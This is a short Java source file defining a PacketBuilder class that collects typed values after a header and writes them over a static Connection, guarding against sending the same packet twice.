package com.redpois0n.packets.in;

import java.util.ArrayList;
import java.util.List;

import com.redpois0n.Connection;
import com.redpois0n.common.exceptions.PacketAlreadySentException;
import com.redpois0n.packets.out.Header;

public class PacketBuilder {

	private final short header;
	private List<Object> list;
	private boolean sent;

	public PacketBuilder(Header header) {
		this.header = header.getHeader();
	}

	public PacketBuilder(Header header, Object extra) {
		this(header, new Object[] { extra });
	}

	public PacketBuilder(Header header, Object[] extra) {
		short h = header.getHeader();

		for (Object obj : extra) {
			add(obj);
		}

		this.header = h;
	}

	public void add(Object obj) {
		if (list == null) {
			list = new ArrayList<Object>();
		}

		list.add(obj);
	}

	public synchronized void write() {
		try {
			if (sent) {
				throw new PacketAlreadySentException();
			}

			Connection.writeByte(header);

			for (int i = 0; list != null && i < list.size(); i++) {
				Object obj = list.get(i);
				
				if (obj instanceof Integer) {
					Connection.writeInt((Integer) obj);
				} else if (obj instanceof Long) {
					Connection.writeLong((Long) obj);
				} else if (obj instanceof Boolean) {
					Connection.writeBoolean((Boolean) obj);
				} else if (obj instanceof Short) {
					Connection.writeShort((Short) obj);
				} else {
					Connection.writeLine(obj.toString());
				}
				
			}

			sent = true;

			if (list != null) {
				list.clear();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}